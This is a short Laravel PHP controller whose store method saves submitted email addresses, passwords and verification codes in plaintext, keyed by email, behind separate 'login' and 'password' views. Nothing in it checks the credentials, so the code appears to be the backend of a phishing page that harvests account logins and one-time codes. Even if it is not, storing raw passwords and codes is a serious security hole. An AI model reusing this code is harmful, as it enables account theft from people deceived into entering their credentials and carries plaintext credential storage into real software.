<?php

namespace App\Http\Controllers;

use App\Models\Email;
use App\Http\Requests\StoreEmailRequest;
use App\Http\Requests\UpdateEmailRequest;

use Illuminate\Http\Request;

class EmailController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        return view('login');
    }

    public function password(Request $request) {
        // dd($request);
        return view('password');
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(StoreEmailRequest $request)
    {
        $data = [
            'email' => $request->email,
            'password' => $request->password,
            'verification' => $request->verification

        ];
        Email::updateOrCreate(['email' => $request->email],$data);

        return response()->json($request->email);
    }

    /**
     * Display the specified resource.
     */
    public function show(Email $email)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(Email $email)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(UpdateEmailRequest $request, Email $email)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(Email $email)
    {
        //
    }
}
